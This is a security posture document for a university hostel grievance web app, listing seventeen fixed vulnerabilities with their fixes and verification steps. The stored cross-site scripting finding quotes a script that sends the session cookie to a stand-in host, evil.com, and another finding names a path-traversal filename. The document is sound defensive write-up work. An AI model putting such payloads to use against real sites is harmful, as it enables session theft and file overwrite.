SECURITY.md  -  HostelGrievance Security Posture
=================================================

APPLICATION OVERVIEW
--------------------
HostelGrievance is a web application for GIET University that allows
students to submit hostel grievances and wardens to review and resolve them.

Built with:
  Frontend  : SvelteKit
  API       : Hono (Node.js)
  Database  : SQLite (better-sqlite3)


WHAT WE FIXED  (17 issues total)
---------------------------------


FINDING 1 - BROKEN ACCESS CONTROL (IDOR)
Risk Level: CRITICAL
........................................................................
The Problem:
  Any logged-in student could read, edit, or comment on another
  student's grievance just by guessing the grievance ID (GRV-0001,
  GRV-0002, etc.). The server never checked whether the grievance
  belonged to the person requesting it.

The Fix:
  Added ownership checks to every route that touches grievance data.
  If a student tries to access a grievance that is not theirs, the
  server now returns 403 Forbidden. Wardens can still see everything.

Files Changed: src/server/routes/grievances.ts
               src/server/routes/attachments.ts

Verified by: Logged in as two different student accounts at the same
  time. Tried to open each other's grievances. Got 403 Forbidden.


FINDING 2 - STORED CROSS-SITE SCRIPTING (XSS)
Risk Level: CRITICAL
........................................................................
The Problem:
  The comment section used a Svelte directive called {@html comment.body}
  which rendered comment text as raw HTML. An attacker could post a
  comment like:

    <script>document.location='http://evil.com?c='+document.cookie</script>

  This script would run in every user's browser when they opened the
  grievance, potentially stealing their login session cookie.

The Fix:
  Replaced {@html comment.body} with plain {comment.body}. Svelte
  automatically escapes all HTML in regular interpolation, so the
  text is shown as characters on screen, never executed as code.

File Changed: src/lib/components/app/comment-timeline.svelte

Verified by: Posted a comment with <script>alert('XSS')</script>.
  It displayed as plain text instead of running.


FINDING 3 - SESSION NOT DESTROYED ON LOGOUT
Risk Level: CRITICAL
........................................................................
The Problem:
  When a user clicked "Log Out", the server only cleared the browser
  cookie. The session record in the database was not deleted. If an
  attacker had previously stolen the session token, they could continue
  using it even after the victim logged out.

The Fix:
  On logout, the server now deletes the session from the database
  before clearing the cookie. A replayed stolen token returns 401.

File Changed: src/server/routes/auth.ts

Verified by: Copied session token before logout. Logged out. Tried
  using the token in an API request. Got 401 Unauthorized.


FINDING 4 - SESSION EXPIRY NOT ENFORCED
Risk Level: HIGH
........................................................................
The Problem:
  Every session had an expiry timestamp stored in the database, but
  the server never read it. Sessions lasted forever in practice.

The Fix:
  The server now checks the expiry timestamp on every request. If the
  session has expired, it is deleted and the user must log in again.

File Changed: src/server/auth/session.ts

Verified by: Manually set a session's expires_at to yesterday in the
  database. Made an API request with that session. Got 401.


FINDING 5 - WEAK PASSWORD STORAGE (SHA-256)
Risk Level: CRITICAL
........................................................................
The Problem:
  Passwords were stored as SHA-256 hashes with no salt. SHA-256 is
  designed for fast checksums, not password storage. An attacker who
  obtains the database can crack all passwords in seconds using
  precomputed "rainbow tables".

The Fix:
  Replaced SHA-256 with bcrypt using 12 salt rounds. bcrypt is slow
  by design (takes ~300ms per check), includes a random salt, and is
  the current industry standard for password storage. The database was
  reset with "npm run db:reset" to apply the new hashes.

File Changed: src/server/auth/passwords.ts

Verified by: Checked the database. All password_hash values now start
  with $2b$ which is the bcrypt format. Login still works.


FINDING 6 - FILE UPLOAD PATH TRAVERSAL
Risk Level: CRITICAL
........................................................................
The Problem:
  Uploaded files were saved using the user's original filename. An
  attacker could upload a file named "../../server/app.ts" and
  overwrite the server's own source code files.

The Fix:
  The stored filename is now always a randomly generated 32-character
  hex string (e.g. a3f1b2c4d5e6f7a8...jpg). The original filename
  is only kept in the database for display, never used to write to disk.

File Changed: src/server/storage/attachments.ts

Verified by: Uploaded a file with a path-traversal name. Checked the
  uploads folder. Found only the random hex filename.


FINDING 7 - SESSION COOKIE SECURITY FLAGS MISSING
Risk Level: HIGH
........................................................................
The Problem:
  The session cookie was missing three critical security flags:

  httpOnly - Without this, browser JavaScript can read the cookie.
             An XSS attack could steal the session token directly.

  SameSite - Without this, the cookie is sent on cross-site requests.
             Malicious websites could make requests on the user's behalf
             (Cross-Site Request Forgery / CSRF).

  Secure   - Without this, the cookie is sent over plain HTTP (no
             encryption). Anyone on the same Wi-Fi could intercept it.

The Fix:
  All three flags are now set: httpOnly=true, SameSite=Lax, Secure=true.

File Changed: src/server/auth/session.ts

Verified by: Opened DevTools. Checked the Set-Cookie response header.
  All three flags are visible.


FINDING 8 - UPLOADED FILES DISPLAYED IN BROWSER
Risk Level: HIGH
........................................................................
The Problem:
  Attachments were served with "Content-Disposition: inline", which
  tells the browser to display the file directly in the tab. A
  carefully crafted file could contain scripts that run when the
  browser tries to render it.

The Fix:
  Changed to "Content-Disposition: attachment". The browser now
  always downloads the file instead of rendering it.

File Changed: src/server/routes/attachments.ts

Verified by: Clicked an attachment link. Browser showed a download
  dialog instead of opening the file in the tab.


FINDING 9 - CORS OPEN TO ALL WEBSITES
Risk Level: HIGH
........................................................................
The Problem:
  The API accepted cookie-bearing requests from any website in the
  world. A malicious website visited by a logged-in student could
  silently submit grievances or read private data on their behalf.

The Fix:
  CORS is now restricted to http://localhost:5173 only. Requests from
  any other origin are blocked by the browser's CORS enforcement.

File Changed: src/server/app.ts

Verified by: Sent a credentialed request from a different origin in
  DevTools. Got a CORS error.


FINDING 10 - MISSING SECURITY HEADERS
Risk Level: MEDIUM
........................................................................
The Problem:
  The server sent no browser security headers. This left users
  unprotected against several categories of attacks.

The Fix:
  Five headers are now sent with every response:

  X-Content-Type-Options: nosniff
    Stops the browser from guessing file types. Prevents a file
    stored as .png but containing HTML from being rendered as a page.

  X-Frame-Options: DENY
    Prevents the app from being embedded inside an iframe on another
    site. Protects against "clickjacking" attacks.

  Referrer-Policy: strict-origin-when-cross-origin
    Controls how much URL information is shared when users navigate
    to external links.

  Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
    A strict lockdown policy for the API. Disallows loading any
    external scripts, styles, or embedding in frames.

  Permissions-Policy: camera=(), microphone=(), geolocation=()
    Explicitly disables the app from requesting access to the
    user's camera, microphone, or location.

File Changed: src/server/app.ts

Verified by: Checked Response Headers in browser DevTools. All five
  headers are present on every API response.


FINDING 11 - NO BRUTE FORCE PROTECTION ON LOGIN
Risk Level: HIGH
........................................................................
The Problem:
  There was no limit on how many login attempts could be made. An
  automated script could try millions of passwords per hour.

The Fix:
  Each IP address is now allowed a maximum of 5 login attempts per
  minute. On the 6th attempt the server returns 429 Too Many Requests
  with the message "Too many login attempts. Wait 1 minute."

  A cleanup mechanism also removes expired entries automatically so
  the in-memory store does not grow forever.

File Changed: src/server/routes/auth.ts

Verified by: Clicked "Sign In" with a wrong password 6 times rapidly.
  Got the rate limit error on the 6th attempt.


FINDING 12 - NO SECURITY EVENT LOGGING
Risk Level: MEDIUM
........................................................................
The Problem:
  No record was kept of failed logins, unauthorized access attempts,
  or rate limit hits. An ongoing attack would be invisible to the
  university IT team.

The Fix:
  Every 401 (login failure), 403 (forbidden), and 429 (rate limited)
  response is now logged to both the terminal and a file named
  security.log in the project root. Each entry includes:
    - Date and time
    - IP address of the requester
    - HTTP method and URL path
    - Response status code

File Changed: src/server/app.ts

Verified by: Tried to access another student's grievance. Opened
  security.log. Found a matching 403 entry.


FINDING 13 - USER ENUMERATION VIA TIMING ATTACK
Risk Level: HIGH
........................................................................
The Problem:
  When someone tried to log in with an email that does not exist in
  the database, the server responded almost instantly (about 1ms)
  because it skipped the password check entirely.

  When a real email was used, the server ran bcrypt (~300ms).

  By timing the responses, an attacker could test thousands of email
  addresses and find out which ones are registered, even without
  knowing any passwords.

The Fix:
  Even when the email is not found, the server now runs bcrypt against
  a dummy hash anyway. All login attempts now take ~300ms, making it
  impossible to tell valid from invalid emails by timing.

File Changed: src/server/auth/passwords.ts
              src/server/routes/auth.ts

Verified by: Timed responses for valid and invalid emails. Both now
  take approximately the same amount of time.


FINDING 14 - MIME TYPE SPOOFING ON FILE UPLOAD
Risk Level: HIGH
........................................................................
The Problem:
  The server only checked the Content-Type header that the client
  sends with the file. An attacker can set that header to anything.
  By labelling a malicious HTML or executable file as "image/png",
  it would pass validation and be stored on the server.

The Fix:
  The server now reads the actual first bytes of the uploaded file
  and checks them against known image "magic byte" signatures:

    JPEG  : FF D8 FF
    PNG   : 89 50 4E 47  (reads as .PNG)
    GIF   : 47 49 46     (reads as GIF)
    WebP  : RIFF....WEBP

  If the file's own bytes do not match the claimed type, the upload
  is rejected with "File content does not match the declared type."

File Changed: src/server/storage/attachments.ts

Verified by: Tried uploading a .txt file with Content-Type: image/png.
  Server rejected it.


FINDING 15 - INTERNAL ERROR DETAILS LEAKED TO USERS
Risk Level: HIGH
........................................................................
The Problem:
  When an unexpected error occurred inside the server (database error,
  missing file, etc.), the raw error message was sent to the client.
  This could reveal:
    - Internal file paths  (C:\Users\Lenovo\...)
    - Database table names and SQL syntax
    - Node.js version and OS details

  An attacker could use this information to plan further attacks.

The Fix:
  All unexpected errors now return a single generic message:
    "Internal server error."
  The full error details are still printed to the server console
  for developers to investigate.

File Changed: src/server/http/errors.ts

Verified by: Triggered an error condition. API response showed only
  "Internal server error." Server console showed full details.


FINDING 16 - NO INPUT LENGTH LIMITS (DENIAL OF SERVICE)
Risk Level: HIGH
........................................................................
The Problem:
  There were no upper limits on how long text fields could be.
  An attacker could submit a grievance with a 50 MB description.
  Many such requests could fill up the database and crash the server.

  Additionally, very long passwords could cause bcrypt to consume
  large amounts of CPU time (bcrypt only uses the first 72 bytes
  anyway, so anything longer is wasted work on the attacker's terms).

The Fix:
  Server-side maximum lengths are now enforced on all text inputs:
    Title       : 200 characters
    Description : 5,000 characters
    Comment     : 2,000 characters
    Email       : 254 characters  (per RFC 5321 standard)
    Password    : 72 characters   (bcrypt's internal processing limit)

Files Changed: src/server/routes/grievances.ts
               src/server/routes/auth.ts

Verified by: Submitted a grievance with a 10,000 character title.
  Got 400: "Title must be 200 characters or fewer."


FINDING 17 - DATABASE LOCK CRASHES UNDER CONCURRENT LOAD
Risk Level: MEDIUM
........................................................................
The Problem:
  SQLite's default behaviour is to immediately throw an error
  ("SQLITE_BUSY: database is locked") if two operations try to
  write to the database at the same time. Under any real concurrent
  usage this could crash requests unpredictably.

The Fix:
  Added busy_timeout = 5000 to the database configuration. SQLite
  will now wait up to 5 seconds for a write lock to be released
  before giving up, which handles most real-world bursts gracefully.

File Changed: src/server/db/connection.ts

Verified by: Ran concurrent write operations. No SQLITE_BUSY errors.


ASSUMPTIONS
-----------
  1. The application runs behind a reverse proxy (Nginx or similar)
     in production that handles HTTPS and passes X-Forwarded-For.

  2. The uploads directory is NOT publicly accessible via a static
     file server. All file downloads go through the authenticated
     /api/attachments/:id endpoint.

  3. The SQLite database file is stored outside the web root and
     is not reachable by a browser directly.


RESIDUAL RISKS (things not fully fixed)
-----------------------------------------
  - The rate limiter is in-memory and resets when the server
    restarts. A production deployment should use Redis or a
    database-backed store.

  - Rate limiting is per-IP only. A distributed attack coming
    from many different IP addresses would not be blocked.

  - A student could edit their browser's localStorage to see
    the Warden UI layout, but every actual data request is
    verified server-side and returns 401 or 403.

  - The Secure cookie flag requires HTTPS. Login works in local
    development over plain HTTP, but the cookie will not be sent
    in production unless HTTPS is properly configured.
